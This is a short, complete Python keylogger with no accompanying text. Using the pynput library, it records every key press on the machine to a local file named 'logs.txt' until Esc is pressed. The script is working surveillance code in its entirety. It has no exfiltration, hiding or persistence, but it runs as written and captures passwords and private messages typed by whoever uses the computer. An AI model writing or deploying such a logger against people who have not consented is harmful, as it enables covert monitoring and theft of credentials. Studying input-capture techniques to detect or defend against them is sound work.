from pynput.keyboard import Key, Listener


def on_press(key):
    write_file(key)


def write_file(key):
    with open("logs.txt", "a") as f:
        f.write(str(key).replace("'", "").replace("Key.", "") + '\n')


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
